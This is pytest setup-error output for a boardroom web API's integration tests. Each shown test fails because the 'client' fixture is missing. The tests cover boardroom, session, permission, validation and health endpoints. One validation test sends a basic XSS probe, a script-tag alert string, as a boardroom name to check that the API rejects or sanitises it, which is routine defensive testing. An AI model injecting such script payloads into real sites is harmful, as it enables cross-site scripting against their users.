>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:199
____ ERROR at setup of TestBoardroomEndpoints.test_delete_boardroom_success ____
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 224
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_delete_boardroom_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful boardroom deletion."""
          mock_verify.return_value = "user-thread-123"

          # Mock user (owner)
          mock_user = Mock()
          mock_user.id = 1
          mock_db_service.get_user.return_value = mock_user

          # Mock boardroom
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.owner_id = 1
          mock_db_service.get_boardroom.return_value = mock_boardroom
          mock_db_service.delete_boardroom.return_value = True

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.delete("/api/v1/boardroom/board-123", headers=headers)

          assert response.status_code == status.HTTP_204_NO_CONTENT
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:224
___ ERROR at setup of TestBoardroomEndpoints.test_delete_boardroom_not_owner ___
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 247
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_delete_boardroom_not_owner(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test boardroom deletion by non-owner."""
          mock_verify.return_value = "user-thread-123"

          # Mock user (not owner)
          mock_user = Mock()
          mock_user.id = 2
          mock_user.role = "user"
          mock_db_service.get_user.return_value = mock_user

          # Mock boardroom owned by different user
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.owner_id = 1
          mock_db_service.get_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.delete("/api/v1/boardroom/board-123", headers=headers)

          assert response.status_code == status.HTTP_403_FORBIDDEN
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:247
_ ERROR at setup of TestBoardroomSessionEndpoints.test_create_session_success __
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 275
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_create_session_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful session creation."""
          mock_verify.return_value = "user-thread-123"

          # Mock user
          mock_user = Mock()
          mock_user.id = 1
          mock_db_service.get_user.return_value = mock_user

          # Mock boardroom
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.owner_id = 1
          mock_boardroom.is_active = True
          mock_db_service.get_boardroom.return_value = mock_boardroom

          # Mock session creation
          mock_session = Mock()
          mock_session.id = "session-456"
          mock_session.boardroom_id = "board-123"
          mock_session.title = "Test Session"
          mock_session.status = "active"
          mock_db_service.create_session.return_value = mock_session

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.post("/api/v1/boardroom/board-123/sessions", json={
              "title": "Test Session",
              "description": "A test session",
              "session_type": "discussion"
          }, headers=headers)

          assert response.status_code == status.HTTP_201_CREATED
          data = response.json()
          assert data["title"] == "Test Session"
          assert data["boardroom_id"] == "board-123"
          assert data["status"] == "active"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:275
___ ERROR at setup of TestBoardroomSessionEndpoints.test_get_session_success ___
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 314
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_get_session_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful session retrieval."""
          mock_verify.return_value = "user-thread-123"

          # Mock session
          mock_session = Mock()
          mock_session.id = "session-456"
          mock_session.boardroom_id = "board-123"
          mock_session.title = "Test Session"
          mock_session.status = "active"
          mock_session.owner_id = 1
          mock_db_service.get_session.return_value = mock_session

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.get("/api/v1/boardroom/board-123/sessions/session-456", headers=headers)

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["id"] == "session-456"
          assert data["title"] == "Test Session"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:314
__ ERROR at setup of TestBoardroomSessionEndpoints.test_list_sessions_success __
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 337
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_list_sessions_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful session listing."""
          mock_verify.return_value = "user-thread-123"

          # Mock boardroom access check
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.is_active = True
          mock_db_service.get_boardroom.return_value = mock_boardroom

          # Mock sessions
          mock_sessions = [
              Mock(id="session-1", title="Session 1", boardroom_id="board-123"),
              Mock(id="session-2", title="Session 2", boardroom_id="board-123"),
          ]
          mock_db_service.get_boardroom_sessions.return_value = mock_sessions

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.get("/api/v1/boardroom/board-123/sessions", headers=headers)

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert len(data) == 2
          assert data[0]["id"] == "session-1"
          assert data[1]["id"] == "session-2"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:337
___ ERROR at setup of TestBoardroomSessionEndpoints.test_end_session_success ___
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 365
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_end_session_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful session ending."""
          mock_verify.return_value = "user-thread-123"

          # Mock user
          mock_user = Mock()
          mock_user.id = 1
          mock_db_service.get_user.return_value = mock_user

          # Mock session
          mock_session = Mock()
          mock_session.id = "session-456"
          mock_session.owner_id = 1
          mock_session.status = "active"
          mock_db_service.get_session.return_value = mock_session
          mock_db_service.update_session_status.return_value = mock_session

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.patch("/api/v1/boardroom/board-123/sessions/session-456/end", headers=headers)

          assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:365
_ ERROR at setup of TestBoardroomPermissions.test_admin_can_access_any_boardroom _
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 394
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_admin_can_access_any_boardroom(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test that admin users can access any boardroom."""
          mock_verify.return_value = "admin-thread-123"

          # Mock admin user
          mock_user = Mock()
          mock_user.id = 999
          mock_user.role = "admin"
          mock_db_service.get_user.return_value = mock_user

          # Mock boardroom owned by different user
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.owner_id = 1  # Different owner
          mock_boardroom.name = "Test Boardroom"
          mock_db_service.get_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer admin_token"}
          response = await client.get("/api/v1/boardroom/board-123", headers=headers)

          assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:394
_ ERROR at setup of TestBoardroomPermissions.test_user_cannot_access_private_boardroom _
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 418
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_user_cannot_access_private_boardroom(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test that regular users cannot access private boardrooms they don't own."""
          mock_verify.return_value = "user-thread-123"

          # Mock regular user
          mock_user = Mock()
          mock_user.id = 2
          mock_user.role = "user"
          mock_db_service.get_user.return_value = mock_user

          # Mock private boardroom owned by different user
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.owner_id = 1
          mock_boardroom.settings = {"public": False}
          mock_db_service.get_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer user_token"}
          response = await client.get("/api/v1/boardroom/board-123", headers=headers)

          assert response.status_code == status.HTTP_403_FORBIDDEN
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:418
_ ERROR at setup of TestBoardroomPermissions.test_user_can_access_public_boardroom _
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 442
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_user_can_access_public_boardroom(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test that users can access public boardrooms."""
          mock_verify.return_value = "user-thread-123"

          # Mock regular user
          mock_user = Mock()
          mock_user.id = 2
          mock_user.role = "user"
          mock_db_service.get_user.return_value = mock_user

          # Mock public boardroom owned by different user
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.owner_id = 1
          mock_boardroom.name = "Public Boardroom"
          mock_boardroom.settings = {"public": True}
          mock_db_service.get_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer user_token"}
          response = await client.get("/api/v1/boardroom/board-123", headers=headers)

          assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:442
___ ERROR at setup of TestBoardroomValidation.test_boardroom_name_validation ___
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 472
      @patch('app.utils.auth.verify_token')
      async def test_boardroom_name_validation(self, mock_verify, client: AsyncClient):
          """Test boardroom name validation."""
          mock_verify.return_value = "user-thread-123"

          headers = {"Authorization": "Bearer valid_token"}

          # Test very long name
          long_name = "a" * 300
          response = await client.post("/api/v1/boardroom/", json={
              "name": long_name,
              "description": "Test description"
          }, headers=headers)
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Test special characters in name
          response = await client.post("/api/v1/boardroom/", json={
              "name": "<script>alert('xss')</script>",
              "description": "Test description"
          }, headers=headers)
          # Should either reject or sanitize
          assert response.status_code in [
              status.HTTP_422_UNPROCESSABLE_ENTITY,
              status.HTTP_400_BAD_REQUEST,
              status.HTTP_201_CREATED
          ]
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:472
_ ERROR at setup of TestBoardroomValidation.test_boardroom_settings_validation _
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 499
      @patch('app.utils.auth.verify_token')
      async def test_boardroom_settings_validation(self, mock_verify, client: AsyncClient):
          """Test boardroom settings validation."""
          mock_verify.return_value = "user-thread-123"

          headers = {"Authorization": "Bearer valid_token"}

          # Test invalid max_participants
          response = await client.post("/api/v1/boardroom/", json={
              "name": "Test Boardroom",
              "description": "Test description",
              "settings": {
                  "max_participants": -1  # Invalid
              }
          }, headers=headers)
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Test invalid settings type
          response = await client.post("/api/v1/boardroom/", json={
              "name": "Test Boardroom",
              "description": "Test description",
              "settings": "invalid_settings"  # Should be object
          }, headers=headers)
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:499
__ ERROR at setup of TestBoardroomErrorHandling.test_database_error_handling ___
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 529
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_database_error_handling(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test handling of database errors."""
          mock_verify.return_value = "user-thread-123"

          # Mock database error
          mock_db_service.create_boardroom.side_effect = Exception("Database connection failed")

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.post("/api/v1/boardroom/", json={
              "name": "Test Boardroom",
              "description": "Test description"
          }, headers=headers)

          assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
          data = response.json()
          assert "error" in data
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:529
_ ERROR at setup of TestBoardroomErrorHandling.test_concurrent_access_handling _
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 548
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_concurrent_access_handling(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test handling of concurrent access scenarios."""
          mock_verify.return_value = "user-thread-123"

          # Mock scenario where boardroom is deleted between check and access
          mock_db_service.get_boardroom.side_effect = [
              Mock(id="board-123", name="Test"),  # First call succeeds
              None  # Second call returns None (deleted)
          ]

          headers = {"Authorization": "Bearer valid_token"}

          # First request should work
          response1 = await client.get("/api/v1/boardroom/board-123", headers=headers)
          assert response1.status_code == status.HTTP_200_OK

          # Second request should handle missing boardroom
          response2 = await client.get("/api/v1/boardroom/board-123", headers=headers)
          assert response2.status_code == status.HTTP_404_NOT_FOUND
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:548
_______ ERROR at setup of TestHealthEndpoints.test_health_check_healthy ________
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 20
      @patch('app.services.database.database_service')
      async def test_health_check_healthy(self, mock_db_service, client: AsyncClient):
          """Test health check when all systems are healthy."""
          # Mock healthy database
          mock_db_service.health_check.return_value = {
              "status": "healthy",
              "database": "connected",
              "pool_status": {"size": 5, "checked_in": 3, "checked_out": 2}
          }

          response = await client.get("/health")

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["status"] == "healthy"
          assert data["environment"] == "test"
          assert "version" in data
          assert "components" in data
          assert data["components"]["database"]["status"] == "healthy"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py:20
__ ERROR at setup of TestHealthEndpoints.test_health_check_unhealthy_database __
file /home/paul/boardroom-repo/tests/integration/test_monitoring_endpoints.py, line 40
      @patch('app.services.database.database_service')
      async def test_health_check_unhealthy_database(self, mock_db_service, client: AsyncClient):
          """Test health check when database is unhealthy."""
          # Mock unhealthy database
          mock_db_service.health_check.return_value = {
              "status": "unhealthy",
              "database": "disconnected",
              "error": "Connection timeout"
          }

          response = await client.get("/health")

          assert response.status_code == status.HTTP_503_SERVICE_UNAVAILABLE
          data = response.json()
          assert data["status"] == "unhealthy"
          assert data["components"]["database"]["status"] == "unhealthy"
          assert "Connection timeout" in data["components"]["database"]["error"]
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
